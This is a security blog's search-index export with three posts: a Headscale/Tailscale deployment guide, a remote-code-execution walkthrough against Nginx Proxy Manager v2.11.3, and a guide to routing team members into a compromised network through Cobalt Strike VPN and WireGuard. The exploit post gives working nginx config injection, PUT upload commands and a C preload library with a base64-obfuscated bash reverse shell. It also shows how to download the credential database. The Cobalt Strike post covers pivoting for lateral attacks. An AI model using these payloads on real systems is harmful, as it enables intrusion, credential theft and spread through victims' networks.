src="/SecLabBlog/images/headscale_deploy/image-13.png"></p><p>点击 <code>Add Account</code> 后，会弹出浏览器窗口。与前文相似，我们只需要在 Headscale 服务器上执行页面提示的命令即可。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-14.png"></p><h2 id="群晖客户端"><a href="#群晖客户端" class="headerlink" title="群晖客户端"></a>群晖客户端</h2><p>根据自己设备的系统版本和 CPU，选择对应的 <code>spk</code> 并安装，我使用的是 <code>tailscale-x86_64-1.76.0-700076000-dsm7.spk</code>: </p><p><img src="/SecLabBlog/images/headscale_deploy/image-4.png"></p><p><img src="/SecLabBlog/images/headscale_deploy/image-5.png"></p><p>启动 tailscale: </p><p><img src="/SecLabBlog/images/headscale_deploy/image-6.png"></p><p>打开 SSH 并使用登录群晖 Web 界面的用户名和密码来登录群晖后台: </p><p><img src="/SecLabBlog/images/headscale_deploy/image-7.png"></p><p><img src="/SecLabBlog/images/headscale_deploy/image-8.png"></p><p>接入 Headscale: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tailscale login --login-server=http://xxx.xxx.xxx.xxx:8080/ --accept-routes=<span class="hljs-literal">false</span> --accept-dns=<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image-10.png"></p><p>同前文，访问该 url 并在 Headscale 服务器上执行所示命令即可。</p><h1 id="Headscale-基础维护命令"><a href="#Headscale-基础维护命令" class="headerlink" title="Headscale 基础维护命令"></a>Headscale 基础维护命令</h1><h2 id="操作命名空间"><a href="#操作命名空间" class="headerlink" title="操作命名空间"></a>操作命名空间</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">headscale namespace list <span class="hljs-comment"># 查看所有的namespace</span><br>headscale namespace create default <span class="hljs-comment"># 创建namespace</span><br>headscale namespace destroy default <span class="hljs-comment"># 删除namespace</span><br>headscale namespace rename default myspace <span class="hljs-comment"># 重命名namespace</span><br></code></pre></td></tr></table></figure><h2 id="操作节点"><a href="#操作节点" class="headerlink" title="操作节点"></a>操作节点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">headscale node list <span class="hljs-comment"># 列出所有的节点</span><br>headscale node <span class="hljs-built_in">ls</span> -t <span class="hljs-comment"># 列出所有的节点,同时显示出tag信息</span><br>headscale -n default node <span class="hljs-built_in">ls</span> <span class="hljs-comment"># 只查看namespace为default下的节点</span><br>headscale node delete -i &lt;ID&gt; <span class="hljs-comment"># 根据id删除指定的节点，这里面的id是node list查询出来的id</span><br>headscale node tag -i=2 -t=tag:<span class="hljs-built_in">test</span> <span class="hljs-comment"># 给id为2的node设置tag为tag:test</span><br>headscale node rename -i &lt;ID&gt; New_Name <span class="hljs-comment"># 将指定node重命名</span><br></code></pre></td></tr></table></figure><h2 id="查看节点状态"><a href="#查看节点状态" class="headerlink" title="查看节点状态"></a>查看节点状态</h2><p>服务端执行: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">headscale node list | sed -r <span class="hljs-string">&quot;s/\x1B\[([0-9]&#123;1,2&#125;(;[0-9]&#123;1,2&#125;)?)?[m|K]//g&quot;</span>\<br>| sed <span class="hljs-string">&quot;s/Namespace/Space/g&quot;</span> | sed <span class="hljs-string">&quot;s/online/[+]ON/g&quot;</span> \<br>| sed <span class="hljs-string">&quot;s/offline/[-]OFF/g&quot;</span> | grep <span class="hljs-string">&quot;|&quot;</span> \<br>| awk -F <span class="hljs-string">&quot;|&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&quot;|&quot;$11&quot;|&quot;$7&quot;|&quot;$3&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image-18.png" alt="img.png"></p><h2 id="卸载-Headscale"><a href="#卸载-Headscale" class="headerlink" title="卸载 Headscale"></a>卸载 Headscale</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dpkg -P headscale<br></code></pre></td></tr></table></figure><p>如果提示有文件未删除，则手动删除即可。</p><h1 id="Tailscale-基础维护命令"><a href="#Tailscale-基础维护命令" class="headerlink" title="Tailscale 基础维护命令"></a>Tailscale 基础维护命令</h1><h2 id="查看节点间连接状态"><a href="#查看节点间连接状态" class="headerlink" title="查看节点间连接状态"></a>查看节点间连接状态</h2><p>Windows &#x2F; Linux 客户端执行: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tailscale status<br></code></pre></td></tr></table></figure><p>MacOS 客户端执行: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Applications/Tailscale.app/Contents/MacOS/Tailscale status 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/headscale_deploy/image-19.png"></p><p>其中: </p><ul><li><strong>active; relay</strong>: 表示本机到此节点间采用 <code>derp</code> 中转通信。</li><li><strong>active; direct</strong>: 表示本机到此节点间采用直连通信，是最理想的连接方式。</li><li><strong>idle</strong>: 表示该节点目前处于闲置状态。</li></ul><h2 id="查看节点间延迟"><a href="#查看节点间延迟" class="headerlink" title="查看节点间延迟"></a>查看节点间延迟</h2><p>Windows&#x2F;Linux 环境: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tailscale ping 100.64.0.5<br></code></pre></td></tr></table></figure><p>MacOS 环境: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/Applications/Tailscale.app/Contents/MacOS/Tailscale ping 100.64.0.5<br></code></pre></td></tr></table></figure><p>如下图可见，一开始两个节点之间通过东京的 <code>DERP</code> 服务进行中转，随后成功打洞，实现了低延迟直连。</p><p><img src="/SecLabBlog/images/headscale_deploy/image-15.png"></p>]]></content>
    
    
    <categories>
      
      <category>VPN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VPN</tag>
      
      <tag>Headscale</tag>
      
      <tag>Tailscale</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx Proxy Manager v2.11.3 RCE</title>
    <link href="/SecLabBlog/2024/08/26/nginx_proxy_manager_rce/"/>
    <url>/SecLabBlog/2024/08/26/nginx_proxy_manager_rce/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>该漏洞<strong>并非</strong>是 NPM 项目的代码存在漏洞，而是 NPM Docker 环境的默认配置存在缺陷，在 NPM 用户拥有 <code>Hosts</code> 的 <code>Manage</code> 权限的情况下，可以获取<strong>容器内</strong>的 Shell 。</p><h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>Nginx Proxy Manager (NPM) 基于 Ubuntu + Nginx 容器化部署。</p><p>创建一个空目录，创建 <code>docker-compose.yml</code> 文件，内容：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span><br><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">app:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">&#x27;jc21/nginx-proxy-manager:2.11.3&#x27;</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;80:80&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;81:81&#x27;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;443:443&#x27;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./data:/data</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./letsencrypt:/etc/letsencrypt</span><br></code></pre></td></tr></table></figure><p>在该目录下执行以下命令，以启动容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker compose up -d<br><span class="hljs-comment"># docker-compose up -d</span><br></code></pre></td></tr></table></figure><p>访问 <a href="http://localhost:81/login">http://localhost:81/login</a> 以进行操作。</p><p>初始用户密码：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Email:</span>    admin@example.com<br><span class="hljs-symbol">Password:</span> changeme<br></code></pre></td></tr></table></figure><p>具体细节参考： <a href="https://nginxproxymanager.com/guide/#quick-setup">quick-setup</a></p><p>用户登录后可以设置反向代理、重定向等功能。</p><p><img src="/SecLabBlog/images/npm_rce/image-0.png"></p><p>这些功能基本上都是基于修改 <code>nginx.conf</code> 文件实现的，因此以下的内容本质上都是 <code>nginx.conf</code> 配置安全漏洞，只不过由于该项目允许用户在前端编辑和加载配置文件而能够被利用。</p><p>当然了，搞来搞去也就是在容器里而已，没啥意思，管好用户权限就行了。</p><h1 id="从文件写入到-RCE"><a href="#从文件写入到-RCE" class="headerlink" title="从文件写入到 RCE"></a>从文件写入到 RCE</h1><h2 id="允许-PUT-方式上传"><a href="#允许-PUT-方式上传" class="headerlink" title="允许 PUT 方式上传"></a>允许 PUT 方式上传</h2><p>首先新建一个 <code>Proxy Host</code>：</p><p><img src="/SecLabBlog/images/npm_rce/image-9.png"></p><p>图中 <code>Domain Names</code> 可以写该反代服务器的 IP 或域名，总之能够通过这个地址访问到这个容器里的反代端口即可，我们假设为 <code>npm.example.com</code>。其余字段随便写应该都不影响。</p><p>然后通过高级设置，自定义 <code>nginx.conf</code> 配置文件以允许 <code>PUT</code> 方式上传。</p><p><img src="/SecLabBlog/images/npm_rce/image-1.png"></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">location /gupload/ &#123;<br>dav_methods PUT;<br>alias /etc/;<br>limit_except PUT &#123;<br>deny all;<br>&#125;<br>client_max_body_size 100M;<br>dav_access user:rw;<br>autoindex on;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以通过向 URL <code>http://npm.example.com/gupload/filename</code> 发送 <code>PUT</code> 请求来将文件上传到 <code>/etc/</code> 目录，上传后的文件名应该为 <code>filename</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT -d <span class="hljs-string">&quot;1&quot;</span> http://npm.example.com/gupload/1.txt<br></code></pre></td></tr></table></figure><p>可以看到文件能够被上传到容器内：</p><p><img src="/SecLabBlog/images/npm_rce/image-2.png"></p><h2 id="关于-ld-so-preload-劫持"><a href="#关于-ld-so-preload-劫持" class="headerlink" title="关于 ld.so.preload 劫持"></a>关于 ld.so.preload 劫持</h2><p>理论上我可以通过 <code>写 SSH 私钥</code>、<code>写 Crontab</code> 的方式来实现命令执行，但是为什么要用 <code>ld.so.preload</code> 方式呢？</p><p>首先，这是个容器环境，没有 ssh 服务，所以写私钥没意义。</p><p>其次，这个容器基于 <code>Ubuntu</code>，尽管我们通过 <code>dav_access user:rw;</code> 指定了文件权限为 <code>0600</code>，但是这容器没开 <code>cron</code> 服务，执行不了命令。</p><p>而 <code>ld.so.preload</code> 方案则非常通用。我们不需要给上传的运行库文件设置什么权限，同时 <code>ld.so.preload</code> 文件中允许指定任意位置的 <code>so</code>。最重要的是，大部分进程在执行的时候都会预加载这个 <code>so</code>，十分甚至九分地好用。</p><h2 id="编译-Preload-so"><a href="#编译-Preload-so" class="headerlink" title="编译 Preload.so"></a>编译 Preload.so</h2><p>源码: <code>preload.c</code> 文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//preload.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">void</span> _init(<span class="hljs-type">void</span>) &#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>unlink(<span class="hljs-string">&quot;/etc/ld.so.preload&quot;</span>);<br>system(<span class="hljs-string">&quot;echo \&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4yMi4wLjEvOTA5MCAwPiYx\&quot; | base64 -d | bash -i&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fPIC -shared -o preload.so preload.c -nostartfiles -ldl<br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/npm_rce/image-3.png"></p><h2 id="上传-Preload-so"><a href="#上传-Preload-so" class="headerlink" title="上传 Preload.so"></a>上传 Preload.so</h2><p>依次执行以下两个命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -T <span class="hljs-string">&quot;preload.so&quot;</span> http://npm.example.com/gupload/preload.so<br>curl -X PUT -d <span class="hljs-string">&quot;/etc/preload.so&quot;</span> http://npm.example.com/gupload/ld.so.preload<br></code></pre></td></tr></table></figure><p>执行后，<code>preload.so</code> 和 <code>ld.so.preload</code> 文件应该被会上传到 <code>/etc/</code> 路径下。</p><h2 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h2><p>成功上传后，理论上此时执行任何二进制程序，都会导致恶意 <code>.so</code> 被执行。</p><p>开启监听端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 9090<br></code></pre></td></tr></table></figure><p>根据项目代码，在 <code>WebUI</code> 中，保存配置、禁用和启用配置会造成执行 <code>nginx</code> 命令：</p><p><img src="/SecLabBlog/images/npm_rce/image-4.png"></p><p>项目代码：</p><p><img src="/SecLabBlog/images/npm_rce/image-5.png"></p><p>所以只要禁用配置，就可以执行 <code>nginx</code> 程序，同时造成执行恶意 <code>so</code> 文件以及里面的反弹 <code>Shell</code> 命令。</p><p><img src="/SecLabBlog/images/npm_rce/image-6.png"></p><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><p>相对于 RCE，这个功能显得不是很危险。</p><p>同样的修改 <code>nginx.conf</code> 配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">location /ggimgs &#123; <br><span class="hljs-built_in">alias</span> /data/database.sqlite;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/SecLabBlog/images/npm_rce/image-7.png"></p><p>这样我们就可以通过访问 <code>http://npm.example.com/ggimgs</code> 来下载容器内的 <code>database.sqlite</code> 文件。</p><p>这个文件是 <code>npm</code> 的数据库，里面保存了用户密码。同理也可以下载别的文件（也没别的什么有用的文件了）。</p><p><img src="/SecLabBlog/images/npm_rce/image-8.png"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>漏洞</tag>
      
      <tag>Docker</tag>
      
      <tag>Nginx</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cobalt Strike VPN 内网穿透</title>
    <link href="/SecLabBlog/2024/08/24/cobaltstrike_vpn/"/>
    <url>/SecLabBlog/2024/08/24/cobaltstrike_vpn/</url>
    
    <content type="html"><![CDATA[<h1 id="需求背景"><a href="#需求背景" class="headerlink" title="需求背景"></a>需求背景</h1><ol><li>网上没找到太多和 CS VPN 有关的文章。</li><li>在目标上部署了 CS VPN 后，只有 CS 主控（teamserver） 可以访问目标内网，异地 team 成员无法访问。</li></ol><h1 id="关于-CS-VPN"><a href="#关于-CS-VPN" class="headerlink" title="关于 CS VPN"></a>关于 CS VPN</h1><ol><li><p>CS 这个 VPN 功能很垃圾，除非必要不然别用。</p></li><li><p>VPN 部署在 UDP 等协议下，目标需要能够直接回连主控 IP，会导致暴露主控。</p></li><li><p>不想暴露主控的 IP 就设置 VPN 接口协议为 TCP(Bind) ，此时会从 Beacon 转发，但是会将 Sleep Time 设为 0，否则连接质量会很差。</p></li></ol><h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><p><img src="/SecLabBlog/images/cobaltstrike_vpn/0.png" alt="代理拓扑"></p><p>通过在 CS 主控服务器上部署 WireGuard VPN 服务，让 team 成员客户端接入 WG VPN 网络，并配置流量转发，以实现 team 成员访问目标内网的能力。</p><p>对于 VPN 本身的安全性和稳定性问题暂时不讨论（我也没辙）。</p><p>如果有更好的解决方案，欢迎提 issue。</p><h1 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h1><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><ul><li><code>CS</code> 和 <code>WG</code> 服务端装在同一云服务器上</li><li>3 台靶机组网，位于台式机上</li><li>1 台攻击机，位于笔记本电脑</li><li>攻击机和靶机环境物理隔绝</li><li>拥有某一台靶机的 <code>CS Beacon</code> 会话</li><li>在该靶机上部署了 <code>CS VPN</code></li></ul><p><img src="/SecLabBlog/images/cobaltstrike_vpn/1.png" alt="靶机情况"></p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/2.png" alt="靶机内网"></p><p>根据参考资料以及拓扑图，我们需要搭建两个 VPN 网络：</p><ul><li><code>CS 主控</code> 为核心的：<code>靶机 Beacon -&gt; CS 主控</code> VPN 网络，靶机为客户端。</li><li><code>WG 服务</code> 为核心的：<code>team 成员 -&gt; WG</code> VPN 网络，<code>team成员</code> 为客户端。</li><li><code>CS 主控</code> 和 <code>WG 服务</code> 位于同一公网云主机。</li></ul><h2 id="Cobalt-Strike-VPN-部署"><a href="#Cobalt-Strike-VPN-部署" class="headerlink" title="Cobalt Strike VPN 部署"></a>Cobalt Strike VPN 部署</h2><p>在 CS 客户端界面即可操作。</p><p>通过 CS 在目标主机部署 VPN 客户端后，还需要在 CS 主控（teamserver）上启用虚拟网卡并配置 IP 地址和网关信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用虚拟网卡，记住刚才创建的网卡名称，不确定就用 ip a 命令查看</span><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> phear1 up<br><span class="hljs-comment"># 设置 IP 和掩码</span><br><span class="hljs-built_in">sudo</span> ip addr add 192.168.163.211/24 dev phear1<br></code></pre></td></tr></table></figure><p>正确配置后，CS 主控（teamserver）应该能访问目标内网。</p><p>CS VPN 接口:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/3.png"></p><p>CS 主控服务器虚拟网卡:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/4.png"></p><p>CS 主控服务器路由:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/5.png"></p><p>CS 主控服务器成功通过 CS VPN 访问靶机内网其他主机:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/7.png"></p><h2 id="WireGuard-VPN-部署"><a href="#WireGuard-VPN-部署" class="headerlink" title="WireGuard VPN 部署"></a>WireGuard VPN 部署</h2><p>WG 服务端部署参考：<a href="https://yangpin.link/archives/1601.html">https://yangpin.link/archives/1601.html</a></p><p>注意：为了让 <code>WG VPN</code> 成员能够通过 <code>WG VPN</code> 服务器访问其他网段，需要开启转发</p><p>其中，我们根据实际环境要确定几个信息：</p><ul><li>WG 服务器公网监听所使用的网卡：<code>eth0</code></li><li>WG 服务器公网监听端口：<code>51820</code></li><li>WG 服务器 VPN 服务虚拟网卡：<code>wg0</code></li><li>VPN 虚拟网段：<code>10.252.1.0/24</code></li></ul><p>开启 IP 转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;net.ipv4.ip_forward = 1&quot;</span> &gt;&gt; /etc/sysctl.conf<br>sysctl -p<br></code></pre></td></tr></table></figure><p>开启 iptables 转发：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -A POSTROUTING -s 10.252.1.0/24 -o eth0 -j MASQUERADE; iptables -A INPUT -p udp -m udp --dport 51820 -j ACCEPT; iptables -A FORWARD -i wg0 -j ACCEPT; iptables -A FORWARD -o wg0 -j ACCEPT; <br></code></pre></td></tr></table></figure><p>CS 主控服务器 iptables:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/6.png"></p><h2 id="配置-Team-成员以访问目标内网"><a href="#配置-Team-成员以访问目标内网" class="headerlink" title="配置 Team 成员以访问目标内网"></a>配置 Team 成员以访问目标内网</h2><p>先关闭 <code>team</code> 成员设备上的 <code>WG VPN</code> 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wg-quick down /path/to/config<br></code></pre></td></tr></table></figure><p>根据前文信息，我们目标内网为 <code>192.168.163.0/24</code>，那么可以修改 <code>team</code> 成员设备的 <code>WG VPN</code> 客户端配置文件：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">AllowedIPs = 192.168.163.0/24<br></code></pre></td></tr></table></figure><p>完整内容如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">[Interface]<br>Address = 10.252.1.1/32<br>PrivateKey = 6DhDQcQOwFOW80muHxxxxxxxxxxxxxxxxxxx<br>MTU = 1450<br><br>[Peer]<br>PublicKey = 3Nr7DWnVmRwsl+yAF7HPMxxxxxxxxxxxxxx<br>PresharedKey = 9+HxR/pQvH0Srv/6Iuzxxxxxxxxxxxxxxxx<br>AllowedIPs = 192.168.163.0/24<br>Endpoint = 1.2.3.4:51820<br>PersistentKeepalive = 15<br></code></pre></td></tr></table></figure><p>这样设置的意思是该客户端所有发往 <code>192.168.163.0/24</code> 的流量都从 VPN 隧道传输，而且不影响成员主机正常访问互联网。</p><p>而由于我们的 <code>WG 服务端</code> 和 <code>CS 主控</code> 是同一设备，<code>CS 主控</code> 可以访问目标内网，就可以让 team 成员通过 <code>WG 服务端</code> 进入目标内网。</p><p>启用 <code>team</code> 成员设备上的 <code>WG VPN</code> 客户端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> wg-quick up /path/to/config<br></code></pre></td></tr></table></figure><p>启用客户端后，会自动创建虚拟网卡，自动配置 ip 和路由。</p><p>team 成员 WireGuard 虚拟网卡信息:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/8.png"></p><p>team 成员 WireGuard 虚拟网卡路由:</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/9.png"></p><p>team 成员通过 <code>WG VPN</code> 访问目标靶机内网：</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/10.png"></p><p>team 成员通过漏洞利用，攻击靶机内网的其他设备：</p><p><img src="/SecLabBlog/images/cobaltstrike_vpn/11.png"></p>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cobalt Strike</tag>
      
      <tag>CS</tag>
      
      <tag>VPN</tag>
      
      <tag>内网穿透</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
